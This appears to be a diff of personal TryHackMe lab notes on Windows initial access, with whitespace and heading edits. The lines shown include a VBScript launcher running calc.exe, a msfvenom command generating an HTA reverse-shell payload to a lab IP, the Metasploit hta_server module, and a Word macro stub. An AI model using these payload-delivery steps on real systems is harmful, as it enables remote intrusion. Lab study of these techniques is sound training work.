@@ -614,10 +614,13 @@ ProxyPass "/" "http://localhost:8080/"
 # WScript / CScript.exe / VBS #
 
 Dim message 
+
 message = "Welcome to THM"
+
 MsgBox message
 
 Set shell = WScript.CreateObject("Wscript.Shell")
+
 shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
 
 wscript c:\Users\thm\Desktop\payload.vbs
@@ -641,7 +644,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh
 
 use exploit/windows/misc/hta_server
 
-## Word Macro ##
+# Word Macro #
 
 Sub Document_Open()
   THM
